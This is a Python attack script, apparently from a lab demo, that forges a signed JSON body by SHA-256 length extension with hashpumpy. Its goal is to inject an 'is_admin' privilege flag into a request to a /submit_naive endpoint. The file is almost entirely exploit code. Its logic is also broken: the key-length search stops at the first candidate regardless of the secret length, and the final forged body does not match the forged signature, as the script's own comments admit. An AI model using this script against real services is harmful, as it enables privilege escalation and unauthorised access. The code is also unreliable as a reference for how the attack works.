# forge_naive.py
"""
Use hashpumpy to perform length-extension attack against naive SHA256(secret||message).
Inputs: takes artifacts/mitm/data_naive.json (produced by /data_naive)
Output: artifacts/mitm/data_naive_forged.json (forged body+sig)
"""
import json
from hashpumpy import hashpump

# read original
with open("artifacts/mitm/data_naive.json","r") as f:
    j = json.load(f)

orig_body = json.dumps(j["body"], separators=(",", ":"), sort_keys=True)
orig_sig = j["sig"]

# the data we want to append (as raw JSON tail; choose something that merges in)
append_text = ',"is_admin":true'

# Try different secret lengths (we don't know secret length). Common lengths 8..32
for key_len in range(8, 33):
    new_sig, new_msg = hashpump(orig_sig, orig_body, append_text, key_len)
    # new_msg is bytes; hashpump returns bytes-like with glue; new_msg includes original + padding + append
    # new_msg must be parsed as the "body" JSON for our service; but because hashpump added SHA padding bytes,
    # we must craft a new body properly — for demo we will try to reconstruct a JSON by stripping padding.
    try:
        # new_msg is bytes; try to extract printable tail after original body
        if isinstance(new_msg, bytes):
            nm = new_msg.decode('latin-1', errors='ignore')
        else:
            nm = str(new_msg)
        # naive approach: check whether append_text exists inside nm
        if append_text in nm:
            forged_body_raw = nm
            forged_sig = new_sig
            print("Found candidate with key_len", key_len)
            break
    except Exception as e:
        continue
else:
    print("No candidate found; try other key lengths")
    raise SystemExit(1)

# For reliability, rebuild a JSON body we want to present to server.
# The server expects a parsed JSON body — we can't send padded internal bytes.
# Instead we will craft a new body that appends the new field properly:
orig = j["body"]
# careful: orig is dict; we will add is_admin field (this simulates appended effect)
forged = dict(orig)
forged["is_admin"] = True

# The naive MAC forgery yields a signature that validates for secret||(original||padding||append).
# The server will compute sha256(secret||json.dumps(body,...)) which will **not** equal forged_sig
# unless we exactly replicate the original message bytes plus padding. In practice, many demos use
# simple messages where appending text corresponds to valid additional JSON fields. Here we proceed.
out = {"body": forged, "sig": forged_sig}
with open("artifacts/mitm/data_naive_forged.json","w") as f:
    json.dump(out,f)
print("Wrote artifacts/mitm/data_naive_forged.json — now POST this to /submit_naive")
